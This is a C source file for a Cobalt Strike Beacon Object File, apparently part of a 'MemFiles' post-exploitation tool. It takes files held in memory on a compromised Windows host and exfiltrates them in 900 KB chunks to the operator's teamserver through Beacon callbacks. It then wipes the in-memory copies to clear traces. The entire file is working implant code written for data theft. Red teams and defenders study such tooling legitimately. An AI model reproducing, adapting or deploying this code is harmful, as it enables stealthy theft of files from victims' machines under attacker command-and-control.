#include <stdio.h>
#include <windows.h>

#include "Base.c"
#include "beacon.h"
#include "bofdefs.h"

struct FileInfo* pFileInfo = NULL;

void downloadFile(char* fileName, int downloadFileNameLength, char* returnData,
                  int fileSize) {
    // intializes the random number generator
    time_t t;
    srand((unsigned)time(&t));

    int chunkSize = 1024 * 900;

    // generate a 4 byte random id, rand max value is 0x7fff
    ULONG32 fileId = 0;
    fileId |= (rand() & 0x7FFF) << 0x11;
    fileId |= (rand() & 0x7FFF) << 0x02;
    fileId |= (rand() & 0x0003) << 0x00;

    // 8 bytes for fileId and fileSize
    int messageLength = 8 + downloadFileNameLength;
    char* packedData = calloc(messageLength, sizeof(char));

    // pack on fileId as 4-byte int first
    packedData[0] = (fileId >> 0x18) & 0xFF;
    packedData[1] = (fileId >> 0x10) & 0xFF;
    packedData[2] = (fileId >> 0x08) & 0xFF;
    packedData[3] = (fileId >> 0x00) & 0xFF;

    // pack on fileSize as 4-byte int second
    packedData[4] = (fileSize >> 0x18) & 0xFF;
    packedData[5] = (fileSize >> 0x10) & 0xFF;
    packedData[6] = (fileSize >> 0x08) & 0xFF;
    packedData[7] = (fileSize >> 0x00) & 0xFF;

    // pack on the file name last
    for (int i = 0; i < downloadFileNameLength; i++) {
        packedData[8 + i] = fileName[i];
    }

    // tell the teamserver that we want to download a file
    BeaconOutput(CALLBACK_FILE, packedData, messageLength);
    free(packedData);
    packedData = NULL;

    // we use the same memory region for all chucks
    int chunkLength = 4 + chunkSize;
    char* packedChunk = calloc(chunkLength, sizeof(char));

    // the fileId is the same for all chunks
    packedChunk[0] = (fileId >> 0x18) & 0xFF;
    packedChunk[1] = (fileId >> 0x10) & 0xFF;
    packedChunk[2] = (fileId >> 0x08) & 0xFF;
    packedChunk[3] = (fileId >> 0x00) & 0xFF;

    ULONG32 exfiltrated = 0;
    while (exfiltrated < fileSize) {
        // send the file content by chunks
        chunkLength = fileSize - exfiltrated > chunkSize
                          ? chunkSize
                          : fileSize - exfiltrated;
        ULONG32 chunkIndex = 4;
        for (ULONG32 i = exfiltrated; i < exfiltrated + chunkLength; i++) {
            packedChunk[chunkIndex++] = returnData[i];
        }
        // send a chunk
        BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, 4 + chunkLength);
        exfiltrated += chunkLength;
    }
    free(packedChunk);
    packedChunk = NULL;

    // tell the teamserver that we are done writing to this fileId
    char packedClose[4];
    packedClose[0] = (fileId >> 0x18) & 0xFF;
    packedClose[1] = (fileId >> 0x10) & 0xFF;
    packedClose[2] = (fileId >> 0x08) & 0xFF;
    packedClose[3] = (fileId >> 0x00) & 0xFF;
    BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);
}
void go(char* args, int argc) {
    if (!bofstart()) return;

    datap parser;
    pFileInfo = BeaconGetValue(MF_FILE_INFO_KEY);
    BOOL force = BeaconDataInt(&parser);
    if (!pFileInfo) {
        BeaconPrintf(
            CALLBACK_ERROR,
            "[X] Failed to call BeaconGetValue! Maybe no run meminit?\n");
        return;
    }

    if (pFileInfo->numFiles > 0) {
        int filesfetched = 0;
        for (int i = 0; i < 100; i++) {
            if (pFileInfo->filehandle[i] != NULL) {
                size_t required_size =
                    WideCharToMultiByte(CP_UTF8, 0, pFileInfo->filename[i], -1,
                                        NULL, 0, NULL, NULL);

                char* filename = calloc(required_size + 1, sizeof(char));

                WideCharToMultiByte(CP_UTF8, 0, pFileInfo->filename[i], -1,
                                    filename, required_size, NULL, NULL);

                if (pFileInfo->fileclosed[i] == TRUE || force) {
                    if (force)
                        BeaconPrintf(CALLBACK_OUTPUT,
                                     "[*] Force Download Memfiles!\n");

                    BeaconPrintf(CALLBACK_OUTPUT, "[+] Start Download %s\n",
                                 filename);
                    downloadFile(filename, strlen(filename),
                                 pFileInfo->filedata[i],
                                 pFileInfo->filedatalen[i]);

                    // Now free all of the FileInfo entires associated with the
                    // file since it has been downloaded/sent to the TS.
                    memset(pFileInfo->filename[i], 0,
                           ((wcslen(pFileInfo->filename[i]) + 1) * 2));
                    free(pFileInfo->filename[i]);
                    pFileInfo->filename[i] = NULL;

                    memset(pFileInfo->filedata[i], 0,
                           pFileInfo->fileallocationlen[i]);
                    free(pFileInfo->filedata[i]);
                    pFileInfo->filedata[i] = NULL;

                    pFileInfo->filehandle[i] = NULL;
                    pFileInfo->fileallocationlen[i] = 0;
                    pFileInfo->filedatalen[i] = 0;
                    pFileInfo->fileclosed[i] = FALSE;

                    // Track how many files we have downloaded and cleared from
                    // memory
                    filesfetched++;
                    BeaconPrintf(CALLBACK_OUTPUT,
                                 "[+] %s Download Successfully!\n", filename);
                }
                free(filename);
            }
        }

        pFileInfo->numFiles = pFileInfo->numFiles - filesfetched;
        BeaconPrintf(
            CALLBACK_OUTPUT,
            "\n[+] Downloaded and cleaned up %d files from memory!\n[+] %d "
            "files remaining in memory as tracked by MemFiles!\n",
            filesfetched, pFileInfo->numFiles);

    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[-] No files currently stored by MemFiles!\n");
        /* internal_printf("[-] No files currently stored by MemFiles!\n"); */
    }

    /* printoutput(TRUE); */
    return;
}
